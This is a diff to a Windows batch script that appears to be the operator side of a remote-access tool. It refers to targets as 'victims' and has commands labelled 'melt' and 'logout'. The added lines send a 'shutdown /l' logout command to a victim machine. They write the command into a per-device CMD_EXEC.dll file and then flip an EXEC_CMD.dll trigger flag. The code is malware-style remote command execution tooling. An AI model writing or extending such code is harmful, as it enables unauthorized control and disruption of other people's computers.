@@ -356,6 +356,7 @@ goto crash
 :rce_pc_found
 set "VICTIM_CMD="
 set "VICTIM_SHUTDOWN_TIMER="
+set "VICTIM_LOGOUT_TIME="
 set "VICTIM_MSG_CONTENT="
 set "JAVA_ALERT_1=mshta javascript:alert("
 set "JAVA_ALERT_2=);close();"
@@ -454,7 +455,34 @@ if "!VICTIM_CMD!" == "melt" (
 	)
 )
 if "!VICTIM_CMD!" == "logout" (
-
+	set /p "VICTIM_LOGOUT_TIMER=!reset!!green!Logout Seconds:!reset!!yellow![Type none for 0 seconds]!reset! "
+	ping localhost -n 2 > nul
+	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
+		if "!VICTIM_LOGOUT_TIMER!" == "none" (
+			echo shutdown /l /t 0>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+		) else (
+			echo shutdown /l /t !VICTIM_LOGOUT_TIMER!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+		)
+		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
+			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			ping localhost -n 3 > nul
+			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo !reset!!green!Successfully sent message...
+			echo.
+			goto rce_pc_found
+			goto crash
+		) else (
+			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+			echo.
+			goto rce_pc_found
+			goto crash
+		)
+	) else (
+		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+		echo.
+		goto rce_pc_found
+		goto crash
+	)
 )
 echo !reset!!red_black!Error:!reset! This command is invalid^^! [!VICTIM_CMD!]
 echo.
